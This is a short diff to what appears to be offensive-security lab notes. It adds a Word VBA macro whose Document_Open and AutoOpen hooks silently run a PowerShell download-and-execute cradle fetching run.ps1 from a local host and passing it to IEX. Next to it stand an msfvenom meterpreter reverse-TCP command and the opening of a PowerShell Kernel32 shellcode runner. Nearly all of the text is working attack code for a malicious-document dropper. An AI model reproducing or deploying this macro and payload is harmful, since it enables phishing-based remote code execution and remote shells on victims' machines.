@@ -1,5 +1,21 @@
 # msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.19.128 EXITFUNC=thread -f ps1
 
+## VBA Code
+Sub MyMacro()
+    Dim str As String
+    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.19.128:8000/run.ps1') | IEX"
+    Shell str, vbHide
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+## Powershell
 $Kernel32 = @"
 using System;
 using System.Runtime.InteropServices;
